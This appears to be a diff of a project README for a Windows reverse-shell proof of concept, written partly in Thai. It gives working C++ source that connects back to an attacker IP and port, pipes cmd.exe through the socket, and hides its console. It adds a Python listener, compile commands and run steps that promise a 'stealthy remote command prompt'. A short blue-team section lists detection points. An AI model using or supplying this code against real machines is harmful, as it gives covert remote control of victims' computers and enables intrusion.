@@ -8,15 +8,15 @@ A proof-of-concept (PoC) project demonstrating Windows API mechanics, Network So
 ## 📌 Project Overview
 This project explores how a reverse shell operates at the OS level on Windows. It demonstrates how to utilize the **Winsock API** to establish a TCP connection and how to hijack the standard input/output streams of a Windows process (`cmd.exe`) using the Win32 API. 
 
-This is a fundamental concept in both offensive security (penetration testing) and defensive security (malware analysis and endpoint detection).
+## 🧠 Core Logic & Mechanics (How it Works)
+โปรแกรมนี้ทำงานโดยอาศัยหลักการของ Windows API 5 ขั้นตอนหลัก:
 
-## 🧠 Core Logic & Mechanics
-
-The execution flow of the program is divided into three main phases:
-
-1. **Network Initialization (Winsock):** Uses `WSAStartup` to initialize the Windows Sockets DLL. Creates a TCP socket using `WSASocketA` and connects back to the listening machine via `WSAConnect`.
-2. **I/O Redirection (The Pipe):** The `STARTUPINFO` structure is manipulated to redirect the standard streams of the command-line process. `hStdInput`, `hStdOutput`, and `hStdError` are assigned the handle of the established network socket.
-3. **Process Creation:** Uses `CreateProcessA` to spawn `cmd.exe`. The `SW_HIDE` flag ensures the process runs invisibly in the background.
+1. **Initialize Winsock (`WSAStartup`):** เปิดใช้งานไลบรารีสำหรับการสื่อสารผ่านเครือข่ายของ Windows
+2. **Create Socket (`WSASocket`):** สร้างช่องทางการเชื่อมต่อแบบ TCP
+3. **Connect to Handler (`WSAConnect`):** สั่งให้ Socket วิ่งชน (Connect) กลับไปยัง IP และ Port ของเครื่องผู้เจาะ (Attacker/Listener)
+4. **I/O Redirection (`STARTUPINFO`):** โค้ดจะทำการชี้ (Redirect) ช่องทางรับข้อมูล (Input) และแสดงผล (Output/Error) ของโปรแกรมที่จะรัน ให้วิ่งผ่าน Socket ที่สร้างไว้แทนที่จะแสดงบนหน้าจอ
+5. **Spawn Process (`CreateProcessA`):** สั่งรัน `cmd.exe` แบบเงียบๆ 
+* **Stealth Mode (`FreeConsole`):** ปลดหน้าต่าง Console ออก ทำให้โปรแกรมรันแบบไม่มีหน้าต่างโผล่ขึ้นมาให้เป้าหมายเห็น
 
 ---
 
@@ -25,75 +25,131 @@ The execution flow of the program is divided into three main phases:
 Create a file named `reverse_shell.cpp` on your target/development machine:
 
 ```cpp
-#include <iostream>
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <iostream>
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "Ws2_32.lib")
 
-void SpawnReverseShell(const char* remote_ip, int remote_port) {
+void ExecuteReverseShell(const char* ip, int port) {
     WSADATA wsaData;
-    SOCKET winsocket;
-    struct sockaddr_in server_addr;
-    STARTUPINFOA si;
+    SOCKET s;
+    struct sockaddr_in addr;
+    STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
-    // 1. Initialize Windows Socket
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return; 
+    // 1. Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
 
-    // 2. Create Socket (TCP)
-    winsocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if (winsocket == INVALID_SOCKET) {
+    // 2. Create Socket
+    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &addr.sin_addr);
+
+    // 3. Connect to Handler (Attacker machine)
+    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        closesocket(s);
         WSACleanup();
         return;
     }
 
-    // 3. Setup Server Address
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(remote_port);
-    inet_pton(AF_INET, remote_ip, &server_addr.sin_addr);
-
-    // 4. Connect to Listener
-    if (WSAConnect(winsocket, (SOCKADDR*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
-        closesocket(winsocket);
-        WSACleanup();
-        return;
-    }
-
-    // 5. I/O Redirection
-    ZeroMemory(&si, sizeof(si));
+    // 4. Redirect CMD Input/Output to Socket
+    memset(&si, 0, sizeof(si));
     si.cb = sizeof(si);
-    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)winsocket;
-    si.wShowWindow = SW_HIDE; // Stealth mode
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
 
-    // 6. Execute CMD Process
-    char cmd[] = "cmd.exe";
-    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-        closesocket(winsocket);
-        WSACleanup();
-        return;
-    }
-
+    // 5. Spawn Process
+    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    
+    // Cleanup 
     WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Cleanup Resources
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    closesocket(winsocket);
+    closesocket(s);
     WSACleanup();
 }
 
 int main() {
-    // [!] CHANGE TO YOUR LISTENER IP AND PORT
-    const char* attacker_ip = "192.168.1.100"; 
-    int port = 4444;
-
-    // Hide the console window
-    HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_HIDE);
-
-    SpawnReverseShell(attacker_ip, port);
+    // ซ่อนหน้าต่าง Console (Stealth mode)
+    FreeConsole(); 
+    
+    // [!] CHANGE IP AND PORT TO YOUR LISTENER
+    ExecuteReverseShell("192.168.1.XX", 4444); 
+    
     return 0;
 }
+```
+
+---
+
+## 🎧 2. The Listener (Python Server)
+
+Create `listener.py` on your attacking/analyzing machine to catch the shell:
+
+```python
+import socket
+
+HOST = '0.0.0.0' # Listen on all interfaces
+PORT = 4444      # Must match the C++ payload
+
+def start_listener():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen(1)
+        print(f"[*] Listening for incoming connections on port {PORT}...")
+        
+        conn, addr = s.accept()
+        with conn:
+            print(f"[+] Connection established from target: {addr}")
+            while True:
+                try:
+                    command = input("Target-Shell> ")
+                    if command.lower() in ['exit', 'quit']:
+                        conn.sendall(b"exit\n")
+                        break
+                    if command.strip() == "":
+                        continue
+                        
+                    conn.sendall(f"{command}\n".encode())
+                    response = conn.recv(4096)
+                    print(response.decode(errors='replace'), end='')
+                except KeyboardInterrupt:
+                    break
+
+if __name__ == "__main__":
+    start_listener()
+```
+
+---
+
+## ⚙️ Compilation & Execution (Lab Environment)
+
+### Step 1: Start the Listener
+On your analyzing/listener machine, run the Python script:
+```bash
+python3 listener.py
+```
+
+### Step 2: Compile the C++ Payload
+If using MinGW on Linux or Windows, compile with the `ws2_32` library linked to enable Windows Sockets:
+```bash
+x86_64-w64-mingw32-g++ reverse_shell.cpp -o shell.exe -lws2_32
+```
+*(Note: Be sure to change `"192.168.1.XX"` in the C++ code to the IP address of the machine running `listener.py` before compiling).*
+
+### Step 3: Execute
+Run `shell.exe` on the target Windows machine. The console window will immediately disappear (thanks to `FreeConsole()`), and you will receive a stealthy remote command prompt on your listener terminal.
+
+---
+
+## 🔍 Detection & Mitigation (Blue Team Perspective)
+* **Network Traffic:** Detect unusual outbound TCP connections from background processes.
+* **Process Anomalies:** Monitor `cmd.exe` executing without a visible window (`FreeConsole`) or with an unexpected parent process.
+* **API Monitoring:** EDRs can hook `CreateProcessA` and flag it if `hStdInput`/`hStdOutput` are assigned to a socket handle.
+
+## 📄 License
+MIT License
